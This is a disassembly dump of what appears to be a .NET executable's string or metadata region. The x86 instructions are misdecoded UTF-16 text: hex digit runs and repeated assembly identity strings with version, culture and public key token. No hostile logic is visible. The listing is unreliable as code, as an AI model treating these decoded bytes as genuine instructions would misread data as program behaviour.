  405d16:	inc    ebp
  405d17:	add    BYTE PTR [edx],dh
  405d19:	add    BYTE PTR [ecx],dh
  405d1b:	add    BYTE PTR [eax],bh
  405d1d:	add    BYTE PTR [ecx],bh
  405d1f:	add    BYTE PTR [esi+0x0],al
  405d22:	xor    al,0x0
  405d24:	xor    eax,0x45004400
  405d29:	add    BYTE PTR [esi+0x0],al
  405d2c:	xor    al,0x0
  405d2e:	add    BYTE PTR ss:[edx+0x0],al
  405d32:	xor    al,BYTE PTR [eax]
  405d34:	inc    ecx
  405d35:	add    BYTE PTR [edx],dh
  405d37:	add    BYTE PTR [edx+0x0],al
  405d3a:	xor    DWORD PTR [eax],eax
  405d3c:	xor    al,BYTE PTR [eax]
  405d3e:	xor    al,0x0
  405d40:	aaa    
  405d41:	add    BYTE PTR [ecx+0x0],al
  405d44:	inc    esp
  405d45:	add    BYTE PTR [ebx+0x0],al
  405d48:	xor    eax,DWORD PTR [eax]
  405d4a:	add    BYTE PTR ss:0x42003200,dh
  405d51:	add    BYTE PTR [esi+0x0],al
  405d54:	xor    eax,0x33004300
  405d59:	add    BYTE PTR [eax],dh
  405d5b:	add    BYTE PTR [eax],bh
  405d5d:	add    BYTE PTR [eax],dh
  405d5f:	add    BYTE PTR ds:0x44003500,dh
  405d65:	add    BYTE PTR [ecx+0x0],al
  405d68:	cmp    DWORD PTR [eax],eax
  405d6a:	and    BYTE PTR [edi],dh
  405d6c:	add    BYTE PTR [ebx+0x0],ah
  405d6f:	add    BYTE PTR gs:[ebx+0x0],ah
  405d73:	cmp    BYTE PTR [eax],al
  405d75:	xor    eax,0x37006400
  405d7a:	add    BYTE PTR [edx+0x0],ah
  405d7d:	add    BYTE PTR gs:[ecx+0x0],ah
  405d81:	aaa    
  405d82:	add    BYTE PTR [edi],dh
  405d84:	add    BYTE PTR [ecx],bh
  405d86:	add    BYTE PTR [eax],bh
  405d88:	add    BYTE PTR [ebp+0x0],ah
  405d8b:	add    BYTE PTR [eax+0x300030],0x32
  405d92:	add    BYTE PTR [eax+eax*1],dh
  405d95:	xor    BYTE PTR [eax],al
  405d97:	xor    BYTE PTR [eax],al
  405d99:	xor    BYTE PTR [eax],al
  405d9b:	xor    BYTE PTR [eax],al
  405d9d:	xor    BYTE PTR [eax],al
  405d9f:	xor    al,0x0
  405da1:	cmp    BYTE PTR [eax],al
  405da3:	xor    BYTE PTR [eax],al
  405da5:	xor    BYTE PTR [eax],al
  405da7:	xor    BYTE PTR [eax],al
  405da9:	xor    BYTE PTR [eax],al
  405dab:	xor    BYTE PTR [eax],al
  405dad:	cmp    DWORD PTR [eax],eax
  405daf:	xor    al,0x0
  405db1:	xor    BYTE PTR [eax],al
  405db3:	xor    BYTE PTR [eax],al
  405db5:	xor    BYTE PTR [eax],al
  405db7:	xor    BYTE PTR [eax],al
  405db9:	xor    BYTE PTR [eax],al
  405dbb:	xor    BYTE PTR [eax],al
  405dbd:	xor    BYTE PTR [eax],al
  405dbf:	add    BYTE PTR ss:[eax],dh
  405dc2:	add    BYTE PTR [edx],dh
  405dc4:	add    BYTE PTR [eax],dh
  405dc6:	add    BYTE PTR [eax],dh
  405dc8:	add    BYTE PTR [eax],dh
  405dca:	add    BYTE PTR [eax],dh
  405dcc:	add    BYTE PTR [eax],dh
  405dce:	add    BYTE PTR [eax],dh
  405dd0:	add    BYTE PTR [edx],dh
  405dd2:	add    BYTE PTR [eax+eax*1],dh
  405dd5:	xor    BYTE PTR [eax],al
  405dd7:	xor    BYTE PTR [eax],al
  405dd9:	xor    BYTE PTR [eax],al
  405ddb:	xor    BYTE PTR [eax],al
  405ddd:	xor    eax,0x35003200
  405de2:	add    BYTE PTR [ebx],dh
  405de4:	add    BYTE PTR [eax+eax*1],dh
  405de7:	xor    DWORD PTR [eax],eax
  405de9:	xor    eax,DWORD PTR [eax]
  405deb:	xor    DWORD PTR [eax],eax
  405ded:	xor    BYTE PTR [eax],al
  405def:	xor    BYTE PTR [eax],al
  405df1:	xor    BYTE PTR [eax],al
  405df3:	xor    al,0x0
  405df5:	xor    BYTE PTR [eax],al
  405df7:	xor    BYTE PTR [eax],al
  405df9:	xor    BYTE PTR [eax],al
  405dfb:	xor    BYTE PTR [eax],al
  405dfd:	xor    BYTE PTR [eax],al
  405dff:	xor    DWORD PTR [eax],eax
  405e01:	xor    BYTE PTR [eax],al
  405e03:	xor    BYTE PTR [eax],al
  405e05:	xor    BYTE PTR [eax],al
  405e07:	xor    DWORD PTR [eax],eax
  405e09:	xor    BYTE PTR [eax],al
  405e0b:	xor    BYTE PTR [eax],al
  405e0d:	cmp    BYTE PTR [eax],al
  405e0f:	inc    esp
  405e10:	add    BYTE PTR ds:0x43003600,dh
  405e16:	add    BYTE PTR [edi],dh
  405e18:	add    BYTE PTR [esi],dh
  405e1a:	add    BYTE PTR [esi+0x0],al
  405e1d:	cmp    DWORD PTR [eax],eax
  405e1f:	inc    ebp
  405e20:	add    BYTE PTR [eax],bh
  405e22:	add    BYTE PTR [esi],dh
  405e24:	add    BYTE PTR [eax+eax*1],dh
  405e27:	cmp    DWORD PTR [eax],eax
  405e29:	xor    eax,DWORD PTR [eax]
  405e2b:	cmp    BYTE PTR [eax],al
  405e2d:	xor    eax,DWORD PTR [eax]
  405e2f:	xor    BYTE PTR [eax],al
  405e31:	xor    al,0x0
  405e33:	cmp    DWORD PTR [eax],eax
  405e35:	inc    esi
  405e36:	add    BYTE PTR [ebx],dh
  405e38:	add    BYTE PTR [eax],bh
  405e3a:	add    BYTE PTR [ebx],dh
  405e3c:	add    BYTE PTR [ebx+0x0],al
  405e3f:	xor    al,0x0
  405e41:	xor    al,0x0
  405e43:	inc    edx
  405e44:	add    BYTE PTR [ebp+0x0],al
  405e47:	xor    BYTE PTR [eax],al
  405e49:	inc    ebp
  405e4a:	add    BYTE PTR [ebx+0x0],al
  405e4d:	xor    al,BYTE PTR [eax]
  405e4f:	xor    BYTE PTR [eax],al
  405e51:	xor    al,0x0
  405e53:	xor    DWORD PTR [eax],eax
  405e55:	cmp    BYTE PTR [eax],al
  405e57:	xor    DWORD PTR [eax],eax
  405e59:	cmp    BYTE PTR [eax],al
  405e5b:	xor    al,BYTE PTR [eax]
  405e5d:	xor    al,BYTE PTR [eax]
  405e5f:	inc    ecx
  405e60:	add    BYTE PTR [esi],dh
  405e62:	add    BYTE PTR [ebx+0x0],al
  405e65:	xor    eax,DWORD PTR [eax]
  405e67:	xor    DWORD PTR [eax],eax
  405e69:	inc    ebx
  405e6a:	add    BYTE PTR [esi+0x0],al
  405e6d:	xor    eax,0x42004500
  405e72:	add    BYTE PTR [edi],dh
  405e74:	add    BYTE PTR [ebp+0x0],al
  405e77:	inc    esi
  405e78:	add    BYTE PTR [eax+eax*1],dh
  405e7b:	cmp    BYTE PTR [eax],al
  405e7d:	add    BYTE PTR ss:[ecx],bh
  405e80:	add    BYTE PTR [eax+eax*1],dh
  405e83:	xor    al,0x0
  405e85:	inc    esp
  405e86:	add    BYTE PTR [eax],dh
  405e88:	add    BYTE PTR [ebx],dh
  405e8a:	add    BYTE PTR [edx],dh
  405e8c:	add    BYTE PTR [ecx],dh
  405e8e:	add    BYTE PTR [eax],bh
  405e90:	add    BYTE PTR [eax],bh
  405e92:	add    BYTE PTR [ebp+0x0],al
  405e95:	inc    ecx
  405e96:	add    BYTE PTR [ecx],dh
  405e98:	add    BYTE PTR [eax+eax*1+0x33],al
  405e9c:	add    BYTE PTR [ecx],bh
  405e9e:	add    BYTE PTR [edx],dh
  405ea0:	add    BYTE PTR [eax],dh
  405ea2:	add    BYTE PTR [edi],dh
  405ea4:	add    BYTE PTR [esi],dh
  405ea6:	add    BYTE PTR [ebx],dh
  405ea8:	add    BYTE PTR [edi],dh
  405eaa:	add    BYTE PTR [ecx],dh
  405eac:	add    BYTE PTR [edx],dh
  405eae:	add    BYTE PTR [ebx+0x0],al
  405eb1:	inc    ebx
  405eb2:	add    BYTE PTR [edx+0x0],al
  405eb5:	xor    DWORD PTR [eax],eax
  405eb7:	xor    al,BYTE PTR [eax]
  405eb9:	inc    esp
  405eba:	add    BYTE PTR [edi],dh
  405ebc:	add    BYTE PTR ds:0x42004600,dh
  405ec2:	add    BYTE PTR [edi],dh
  405ec4:	add    BYTE PTR [edi],dh
  405ec6:	add    BYTE PTR [ebp+0x0],al
  405ec9:	cmp    DWORD PTR [eax],eax
  405ecb:	cmp    BYTE PTR [eax],al
  405ecd:	xor    DWORD PTR [eax],eax
  405ecf:	xor    DWORD PTR [eax],eax
  405ed1:	xor    DWORD PTR [eax],eax
  405ed3:	xor    al,0x0
  405ed5:	cmp    DWORD PTR [eax],eax
  405ed7:	inc    ebp
  405ed8:	add    BYTE PTR [esi],dh
  405eda:	add    BYTE PTR [ecx],dh
  405edc:	add    BYTE PTR [eax+eax*1],dh
  405edf:	cmp    BYTE PTR [eax],al
  405ee1:	inc    ebp
  405ee2:	add    BYTE PTR ds:0x33004400,dh
  405ee8:	add    BYTE PTR [edx],dh
  405eea:	add    BYTE PTR [esi+0x0],al
  405eed:	inc    edx
  405eee:	add    BYTE PTR [ecx+0x0],al
  405ef1:	inc    ecx
  405ef2:	add    BYTE PTR [edx+0x0],al
  405ef5:	xor    eax,DWORD PTR [eax]
  405ef7:	aaa    
  405ef8:	add    BYTE PTR [esi],dh
  405efa:	add    BYTE PTR [ecx],dh
  405efc:	add    BYTE PTR [ecx],dh
  405efe:	add    BYTE PTR [ebx+0x0],al
  405f01:	xor    DWORD PTR [eax],eax
  405f03:	cmp    BYTE PTR [eax],al
  405f05:	aaa    
  405f06:	add    BYTE PTR [eax],bh
  405f08:	add    BYTE PTR [eax+eax*1+0x44],al
  405f0c:	add    BYTE PTR [ebx+0x0],al
  405f0f:	xor    DWORD PTR [eax],eax
  405f11:	cmp    DWORD PTR [eax],eax
  405f13:	inc    ebp
  405f14:	add    BYTE PTR [edx],dh
  405f16:	add    BYTE PTR [eax],dh
  405f18:	add    BYTE PTR [ebp+0x0],al
  405f1b:	inc    esi
  405f1c:	add    BYTE PTR [ecx],dh
  405f1e:	add    BYTE PTR [ebx],dh
  405f20:	add    BYTE PTR ds:0x30004400,dh
  405f26:	add    BYTE PTR [ebx+0x0],al
  405f29:	inc    edx
  405f2a:	add    BYTE PTR [edx],dh
  405f2c:	add    BYTE PTR [ebx+0x0],al
  405f2f:	inc    esi
  405f30:	add    BYTE PTR [esi+0x0],al
  405f33:	xor    al,BYTE PTR [eax]
  405f35:	inc    edx
  405f36:	add    BYTE PTR [esi+0x0],al
  405f39:	inc    ebp
  405f3a:	add    BYTE PTR [ebx+0x0],al
  405f3d:	xor    eax,DWORD PTR [eax]
  405f3f:	inc    esp
  405f40:	add    BYTE PTR [ecx],dh
  405f42:	add    BYTE PTR [ecx],dh
  405f44:	add    BYTE PTR ds:0x31003800,dh
  405f4a:	add    BYTE PTR [eax],dh
  405f4c:	add    BYTE PTR [ebx+0x0],al
  405f4f:	xor    eax,DWORD PTR [eax]
  405f51:	inc    esp
  405f52:	add    BYTE PTR [ecx],bh
  405f54:	add    BYTE PTR [eax],dh
  405f56:	add    BYTE PTR [esi],dh
  405f58:	add    BYTE PTR [ecx],bh
  405f5a:	add    BYTE PTR [esi],dh
  405f5c:	add    BYTE PTR [ebx],dh
  405f5e:	add    BYTE PTR [eax],bh
  405f60:	add    BYTE PTR [esi+0x0],al
  405f63:	inc    ebp
  405f64:	add    BYTE PTR [eax+eax*1],dh
  405f67:	inc    edx
  405f68:	add    BYTE PTR [ebp+0x0],al
  405f6b:	xor    al,BYTE PTR [eax]
  405f6d:	xor    DWORD PTR [eax],eax
  405f6f:	xor    eax,0x42004400
  405f74:	add    BYTE PTR [esi+0x0],al
  405f77:	aaa    
  405f78:	add    BYTE PTR [ecx],bh
  405f7a:	add    BYTE PTR ds:0x36003800,dh
  405f80:	add    BYTE PTR [ecx],dh
  405f82:	add    BYTE PTR [ecx],bh
  405f84:	add    BYTE PTR [edx],dh
  405f86:	add    BYTE PTR [eax],dh
  405f88:	add    BYTE PTR [ebp+0x0],al
  405f8b:	xor    eax,0x42004100
  405f90:	add    BYTE PTR [esi],dh
  405f92:	add    BYTE PTR [esi+0x0],al
  405f95:	aaa    
  405f96:	add    BYTE PTR [eax+eax*1+0x42],al
  405f9a:	add    BYTE PTR [edx],dh
  405f9c:	add    BYTE PTR [ebp+0x0],al
  405f9f:	xor    al,BYTE PTR [eax]
  405fa1:	inc    ebx
  405fa2:	add    BYTE PTR [ebp+0x0],al
  405fa5:	inc    ebp
  405fa6:	add    BYTE PTR [esi+0x0],al
  405fa9:	xor    DWORD PTR [eax],eax
  405fab:	xor    eax,DWORD PTR [eax]
  405fad:	add    BYTE PTR ss:[ecx+0x0],al
  405fb1:	inc    ebx
  405fb2:	add    BYTE PTR [edx],dh
  405fb4:	add    BYTE PTR [ebx],dh
  405fb6:	add    BYTE PTR [eax+eax*1+0x35],al
  405fba:	add    BYTE PTR [eax+eax*1+0x44],al
  405fbe:	add    BYTE PTR [edx],dh
  405fc0:	add    BYTE PTR [edx+0x0],al
  405fc3:	inc    esi
  405fc4:	add    BYTE PTR [eax],dh
  405fc6:	add    BYTE PTR [ebx],dh
  405fc8:	add    BYTE PTR [ecx],dh
  405fca:	add    BYTE PTR [edi],dh
  405fcc:	add    BYTE PTR [eax],dh
  405fce:	add    BYTE PTR [eax],dh
  405fd0:	add    BYTE PTR [ecx+0x0],al
  405fd3:	inc    ebp
  405fd4:	add    BYTE PTR [ebx+0x0],al
  405fd7:	xor    al,BYTE PTR [eax]
  405fd9:	xor    eax,DWORD PTR [eax]
  405fdb:	xor    al,BYTE PTR [eax]
  405fdd:	inc    esi
  405fde:	add    BYTE PTR [esi],dh
  405fe0:	add    BYTE PTR [ebx+0x0],al
  405fe3:	add    BYTE PTR ss:[edx+0x0],al
  405fe7:	xor    DWORD PTR [eax],eax
  405fe9:	inc    ebx
  405fea:	add    BYTE PTR [edi],dh
  405fec:	add    BYTE PTR [eax],bh
  405fee:	add    BYTE PTR ds:0x34004200,dh
  405ff4:	add    BYTE PTR [ebx],dh
  405ff6:	add    BYTE PTR [eax],dh
  405ff8:	add    BYTE PTR ds:0x31004300,dh
  405ffe:	add    BYTE PTR [edx],dh
  406000:	add    BYTE PTR [ebx],dh
  406002:	add    BYTE PTR [edx+0x0],al
  406005:	xor    eax,DWORD PTR [eax]
  406007:	aaa    
  406008:	add    BYTE PTR [ecx+0x0],al
  40600b:	inc    edx
  40600c:	add    BYTE PTR [eax+0x73006d96],al
  406012:	add    BYTE PTR [ebx+0x0],ah
  406015:	outs   dx,DWORD PTR ds:[esi]
  406016:	add    BYTE PTR [edx+0x0],dh
  406019:	ins    BYTE PTR es:[edi],dx
  40601a:	add    BYTE PTR [ecx+0x0],ch
  40601d:	bound  eax,QWORD PTR [eax]
  40601f:	sub    al,0x0
  406021:	and    BYTE PTR [eax],al
  406023:	push   esi
  406024:	add    BYTE PTR [ebp+0x0],ah
  406027:	jb     0x406029
  406029:	jae    0x40602b
  40602b:	imul   eax,DWORD PTR [eax],0x6e006f
  406031:	cmp    eax,0x2e003400
  406036:	add    BYTE PTR [eax],dh
  406038:	add    BYTE PTR [esi],ch
  40603a:	add    BYTE PTR [eax],dh
  40603c:	add    BYTE PTR [esi],ch
  40603e:	add    BYTE PTR [eax],dh
  406040:	add    BYTE PTR [eax+eax*1],ch
  406043:	and    BYTE PTR [eax],al
  406045:	inc    ebx
  406046:	add    BYTE PTR [ebp+0x0],dh
  406049:	ins    BYTE PTR es:[edi],dx
  40604a:	add    BYTE PTR [eax+eax*1+0x75],dh
  40604e:	add    BYTE PTR [edx+0x0],dh
  406051:	add    BYTE PTR gs:0x65006e00,bh
  406058:	add    BYTE PTR [ebp+0x0],dh
  40605b:	je     0x40605d
  40605d:	jb     0x40605f
  40605f:	popa   
  406060:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406064:	add    BYTE PTR [eax],ah
  406066:	add    BYTE PTR [eax+0x0],dl
  406069:	jne    0x40606b
  40606b:	bound  eax,QWORD PTR [eax]
  40606d:	ins    BYTE PTR es:[edi],dx
  40606e:	add    BYTE PTR [ecx+0x0],ch
  406071:	arpl   WORD PTR [eax],ax
  406073:	dec    ebx
  406074:	add    BYTE PTR [ebp+0x0],ah
  406077:	jns    0x406079
  406079:	push   esp
  40607a:	add    BYTE PTR [edi+0x0],ch
  40607d:	imul   eax,DWORD PTR [eax],0x65
  406080:	add    BYTE PTR [esi+0x0],ch
  406083:	cmp    eax,0x37006200
  406088:	add    BYTE PTR [edi],dh
  40608a:	add    BYTE PTR [ecx+0x0],ah
  40608d:	xor    eax,0x35006300
  406092:	add    BYTE PTR [esi],dh
  406094:	add    BYTE PTR [ecx],dh
  406096:	add    BYTE PTR [ecx],bh
  406098:	add    BYTE PTR [ebx],dh
  40609a:	add    BYTE PTR [eax+eax*1],dh
  40609d:	add    BYTE PTR gs:[eax],dh
  4060a0:	add    BYTE PTR [eax],bh
  4060a2:	add    BYTE PTR [ecx],bh
  4060a4:	add    BYTE PTR [eax+0x7900539c],al
  4060aa:	add    BYTE PTR [ebx+0x0],dh
  4060ad:	je     0x4060af
  4060af:	add    BYTE PTR gs:[ebp+0x0],ch
  4060b3:	add    BYTE PTR cs:[eax+eax*1+0x61],al
  4060b8:	add    BYTE PTR [eax+eax*1+0x61],dh
  4060bc:	add    BYTE PTR [eax+eax*1],ch
  4060bf:	and    BYTE PTR [eax],al
  4060c1:	push   esi
  4060c2:	add    BYTE PTR [ebp+0x0],ah
  4060c5:	jb     0x4060c7
  4060c7:	jae    0x4060c9
  4060c9:	imul   eax,DWORD PTR [eax],0x6e006f
  4060cf:	cmp    eax,0x2e003400
  4060d4:	add    BYTE PTR [eax],dh
  4060d6:	add    BYTE PTR [esi],ch
  4060d8:	add    BYTE PTR [eax],dh
  4060da:	add    BYTE PTR [esi],ch
  4060dc:	add    BYTE PTR [eax],dh
  4060de:	add    BYTE PTR [eax+eax*1],ch
  4060e1:	and    BYTE PTR [eax],al
  4060e3:	inc    ebx
  4060e4:	add    BYTE PTR [ebp+0x0],dh
  4060e7:	ins    BYTE PTR es:[edi],dx
  4060e8:	add    BYTE PTR [eax+eax*1+0x75],dh
  4060ec:	add    BYTE PTR [edx+0x0],dh
  4060ef:	add    BYTE PTR gs:0x65006e00,bh
  4060f6:	add    BYTE PTR [ebp+0x0],dh
  4060f9:	je     0x4060fb
  4060fb:	jb     0x4060fd
  4060fd:	popa   
  4060fe:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406102:	add    BYTE PTR [eax],ah
  406104:	add    BYTE PTR [eax+0x0],dl
  406107:	jne    0x406109
  406109:	bound  eax,QWORD PTR [eax]
  40610b:	ins    BYTE PTR es:[edi],dx
  40610c:	add    BYTE PTR [ecx+0x0],ch
  40610f:	arpl   WORD PTR [eax],ax
  406111:	dec    ebx
  406112:	add    BYTE PTR [ebp+0x0],ah
  406115:	jns    0x406117
  406117:	push   esp
  406118:	add    BYTE PTR [edi+0x0],ch
  40611b:	imul   eax,DWORD PTR [eax],0x65
  40611e:	add    BYTE PTR [esi+0x0],ch
  406121:	cmp    eax,0x37006200
  406126:	add    BYTE PTR [edi],dh
  406128:	add    BYTE PTR [ecx+0x0],ah
  40612b:	xor    eax,0x35006300
  406130:	add    BYTE PTR [esi],dh
  406132:	add    BYTE PTR [ecx],dh
  406134:	add    BYTE PTR [ecx],bh
  406136:	add    BYTE PTR [ebx],dh
  406138:	add    BYTE PTR [eax+eax*1],dh
  40613b:	add    BYTE PTR gs:[eax],dh
  40613e:	add    BYTE PTR [eax],bh
  406140:	add    BYTE PTR [ecx],bh
  406142:	add    BYTE PTR [eax+0x790053b6],al
  406148:	add    BYTE PTR [ebx+0x0],dh
  40614b:	je     0x40614d
  40614d:	add    BYTE PTR gs:[ebp+0x0],ch
  406151:	add    BYTE PTR cs:[eax+eax*1+0x61],al
  406156:	add    BYTE PTR [eax+eax*1+0x61],dh
  40615a:	add    BYTE PTR [esi],ch
  40615c:	add    BYTE PTR [edi+0x0],cl
  40615f:	jb     0x406161
  406161:	popa   
  406162:	add    BYTE PTR [ebx+0x0],ah
  406165:	ins    BYTE PTR es:[edi],dx
  406166:	add    BYTE PTR [ebp+0x0],ah
  406169:	inc    ebx
  40616a:	add    BYTE PTR [eax+eax*1+0x69],ch
  40616e:	add    BYTE PTR [ebp+0x0],ah
  406171:	outs   dx,BYTE PTR ds:[esi]
  406172:	add    BYTE PTR [eax+eax*1+0x2c],dh
  406176:	add    BYTE PTR [eax],ah
  406178:	add    BYTE PTR [esi+0x0],dl
  40617b:	add    BYTE PTR gs:[edx+0x0],dh
  40617f:	jae    0x406181
  406181:	imul   eax,DWORD PTR [eax],0x6e006f
  406187:	cmp    eax,0x2e003400
  40618c:	add    BYTE PTR [eax],dh
  40618e:	add    BYTE PTR [esi],ch
  406190:	add    BYTE PTR [eax],dh
  406192:	add    BYTE PTR [esi],ch
  406194:	add    BYTE PTR [eax],dh
  406196:	add    BYTE PTR [eax+eax*1],ch
  406199:	and    BYTE PTR [eax],al
  40619b:	inc    ebx
  40619c:	add    BYTE PTR [ebp+0x0],dh
  40619f:	ins    BYTE PTR es:[edi],dx
  4061a0:	add    BYTE PTR [eax+eax*1+0x75],dh
  4061a4:	add    BYTE PTR [edx+0x0],dh
  4061a7:	add    BYTE PTR gs:0x65006e00,bh
  4061ae:	add    BYTE PTR [ebp+0x0],dh
  4061b1:	je     0x4061b3
  4061b3:	jb     0x4061b5
  4061b5:	popa   
  4061b6:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4061ba:	add    BYTE PTR [eax],ah
  4061bc:	add    BYTE PTR [eax+0x0],dl
  4061bf:	jne    0x4061c1
  4061c1:	bound  eax,QWORD PTR [eax]
  4061c3:	ins    BYTE PTR es:[edi],dx
  4061c4:	add    BYTE PTR [ecx+0x0],ch
  4061c7:	arpl   WORD PTR [eax],ax
  4061c9:	dec    ebx
  4061ca:	add    BYTE PTR [ebp+0x0],ah
  4061cd:	jns    0x4061cf
  4061cf:	push   esp
  4061d0:	add    BYTE PTR [edi+0x0],ch
  4061d3:	imul   eax,DWORD PTR [eax],0x65
  4061d6:	add    BYTE PTR [esi+0x0],ch
  4061d9:	cmp    eax,0x37006200
  4061de:	add    BYTE PTR [edi],dh
  4061e0:	add    BYTE PTR [ecx+0x0],ah
  4061e3:	xor    eax,0x35006300
  4061e8:	add    BYTE PTR [esi],dh
  4061ea:	add    BYTE PTR [ecx],dh
  4061ec:	add    BYTE PTR [ecx],bh
  4061ee:	add    BYTE PTR [ebx],dh
  4061f0:	add    BYTE PTR [eax+eax*1],dh
  4061f3:	add    BYTE PTR gs:[eax],dh
  4061f6:	add    BYTE PTR [eax],bh
  4061f8:	add    BYTE PTR [ecx],bh
  4061fa:	add    BYTE PTR [eax+0x79005392],al
  406200:	add    BYTE PTR [ebx+0x0],dh
  406203:	je     0x406205
  406205:	add    BYTE PTR gs:[ebp+0x0],ch
  406209:	sub    al,0x0
  40620b:	and    BYTE PTR [eax],al
  40620d:	push   esi
  40620e:	add    BYTE PTR [ebp+0x0],ah
  406211:	jb     0x406213
  406213:	jae    0x406215
  406215:	imul   eax,DWORD PTR [eax],0x6e006f
  40621b:	cmp    eax,0x2e003400
  406220:	add    BYTE PTR [eax],dh
  406222:	add    BYTE PTR [esi],ch
  406224:	add    BYTE PTR [eax],dh
  406226:	add    BYTE PTR [esi],ch
  406228:	add    BYTE PTR [eax],dh
  40622a:	add    BYTE PTR [eax+eax*1],ch
  40622d:	and    BYTE PTR [eax],al
  40622f:	inc    ebx
  406230:	add    BYTE PTR [ebp+0x0],dh
  406233:	ins    BYTE PTR es:[edi],dx
  406234:	add    BYTE PTR [eax+eax*1+0x75],dh
  406238:	add    BYTE PTR [edx+0x0],dh
  40623b:	add    BYTE PTR gs:0x65006e00,bh
  406242:	add    BYTE PTR [ebp+0x0],dh
  406245:	je     0x406247
  406247:	jb     0x406249
  406249:	popa   
  40624a:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40624e:	add    BYTE PTR [eax],ah
  406250:	add    BYTE PTR [eax+0x0],dl
  406253:	jne    0x406255
  406255:	bound  eax,QWORD PTR [eax]
  406257:	ins    BYTE PTR es:[edi],dx
  406258:	add    BYTE PTR [ecx+0x0],ch
  40625b:	arpl   WORD PTR [eax],ax
  40625d:	dec    ebx
  40625e:	add    BYTE PTR [ebp+0x0],ah
  406261:	jns    0x406263
  406263:	push   esp
  406264:	add    BYTE PTR [edi+0x0],ch
  406267:	imul   eax,DWORD PTR [eax],0x65
  40626a:	add    BYTE PTR [esi+0x0],ch
  40626d:	cmp    eax,0x37006200
  406272:	add    BYTE PTR [edi],dh
  406274:	add    BYTE PTR [ecx+0x0],ah
  406277:	xor    eax,0x35006300
  40627c:	add    BYTE PTR [esi],dh
  40627e:	add    BYTE PTR [ecx],dh
  406280:	add    BYTE PTR [ecx],bh
  406282:	add    BYTE PTR [ebx],dh
  406284:	add    BYTE PTR [eax+eax*1],dh
  406287:	add    BYTE PTR gs:[eax],dh
  40628a:	add    BYTE PTR [eax],bh
  40628c:	add    BYTE PTR [ecx],bh
  40628e:	add    BYTE PTR [eax+0x7900539c],al
  406294:	add    BYTE PTR [ebx+0x0],dh
  406297:	je     0x406299
  406299:	add    BYTE PTR gs:[ebp+0x0],ch
  40629d:	add    BYTE PTR cs:[ebx+0x0],al
  4062a1:	outs   dx,DWORD PTR ds:[esi]
  4062a2:	add    BYTE PTR [edx+0x0],dh
  4062a5:	add    BYTE PTR gs:[eax+eax*1],ch
  4062a9:	and    BYTE PTR [eax],al
  4062ab:	push   esi
  4062ac:	add    BYTE PTR [ebp+0x0],ah
  4062af:	jb     0x4062b1
  4062b1:	jae    0x4062b3
  4062b3:	imul   eax,DWORD PTR [eax],0x6e006f
  4062b9:	cmp    eax,0x2e003400
  4062be:	add    BYTE PTR [eax],dh
  4062c0:	add    BYTE PTR [esi],ch
  4062c2:	add    BYTE PTR [eax],dh
  4062c4:	add    BYTE PTR [esi],ch
  4062c6:	add    BYTE PTR [eax],dh
  4062c8:	add    BYTE PTR [eax+eax*1],ch
  4062cb:	and    BYTE PTR [eax],al
  4062cd:	inc    ebx
  4062ce:	add    BYTE PTR [ebp+0x0],dh
  4062d1:	ins    BYTE PTR es:[edi],dx
  4062d2:	add    BYTE PTR [eax+eax*1+0x75],dh
  4062d6:	add    BYTE PTR [edx+0x0],dh
  4062d9:	add    BYTE PTR gs:0x65006e00,bh
  4062e0:	add    BYTE PTR [ebp+0x0],dh
  4062e3:	je     0x4062e5
  4062e5:	jb     0x4062e7
  4062e7:	popa   
  4062e8:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4062ec:	add    BYTE PTR [eax],ah
  4062ee:	add    BYTE PTR [eax+0x0],dl
  4062f1:	jne    0x4062f3
  4062f3:	bound  eax,QWORD PTR [eax]
  4062f5:	ins    BYTE PTR es:[edi],dx
  4062f6:	add    BYTE PTR [ecx+0x0],ch
  4062f9:	arpl   WORD PTR [eax],ax
  4062fb:	dec    ebx
  4062fc:	add    BYTE PTR [ebp+0x0],ah
  4062ff:	jns    0x406301
  406301:	push   esp
  406302:	add    BYTE PTR [edi+0x0],ch
  406305:	imul   eax,DWORD PTR [eax],0x65
  406308:	add    BYTE PTR [esi+0x0],ch
  40630b:	cmp    eax,0x37006200
  406310:	add    BYTE PTR [edi],dh
  406312:	add    BYTE PTR [ecx+0x0],ah
  406315:	xor    eax,0x35006300
  40631a:	add    BYTE PTR [esi],dh
  40631c:	add    BYTE PTR [ecx],dh
  40631e:	add    BYTE PTR [ecx],bh
  406320:	add    BYTE PTR [ebx],dh
  406322:	add    BYTE PTR [eax+eax*1],dh
  406325:	add    BYTE PTR gs:[eax],dh
  406328:	add    BYTE PTR [eax],bh
  40632a:	add    BYTE PTR [ecx],bh
  40632c:	add    BYTE PTR [eax+0x790053a4],al
  406332:	add    BYTE PTR [ebx+0x0],dh
  406335:	je     0x406337
  406337:	add    BYTE PTR gs:[ebp+0x0],ch
  40633b:	add    BYTE PTR cs:[esi+0x0],cl
  40633f:	jne    0x406341
  406341:	ins    DWORD PTR es:[edi],dx
  406342:	add    BYTE PTR [ebp+0x0],ah
  406345:	jb     0x406347
  406347:	imul   eax,DWORD PTR [eax],0x730063
  40634d:	sub    al,0x0
  40634f:	and    BYTE PTR [eax],al
  406351:	push   esi
  406352:	add    BYTE PTR [ebp+0x0],ah
  406355:	jb     0x406357
  406357:	jae    0x406359
  406359:	imul   eax,DWORD PTR [eax],0x6e006f
  40635f:	cmp    eax,0x2e003400
  406364:	add    BYTE PTR [eax],dh
  406366:	add    BYTE PTR [esi],ch
  406368:	add    BYTE PTR [eax],dh
  40636a:	add    BYTE PTR [esi],ch
  40636c:	add    BYTE PTR [eax],dh
  40636e:	add    BYTE PTR [eax+eax*1],ch
  406371:	and    BYTE PTR [eax],al
  406373:	inc    ebx
  406374:	add    BYTE PTR [ebp+0x0],dh
  406377:	ins    BYTE PTR es:[edi],dx
  406378:	add    BYTE PTR [eax+eax*1+0x75],dh
  40637c:	add    BYTE PTR [edx+0x0],dh
  40637f:	add    BYTE PTR gs:0x65006e00,bh
  406386:	add    BYTE PTR [ebp+0x0],dh
  406389:	je     0x40638b
  40638b:	jb     0x40638d
  40638d:	popa   
  40638e:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406392:	add    BYTE PTR [eax],ah
  406394:	add    BYTE PTR [eax+0x0],dl
  406397:	jne    0x406399
  406399:	bound  eax,QWORD PTR [eax]
  40639b:	ins    BYTE PTR es:[edi],dx
  40639c:	add    BYTE PTR [ecx+0x0],ch
  40639f:	arpl   WORD PTR [eax],ax
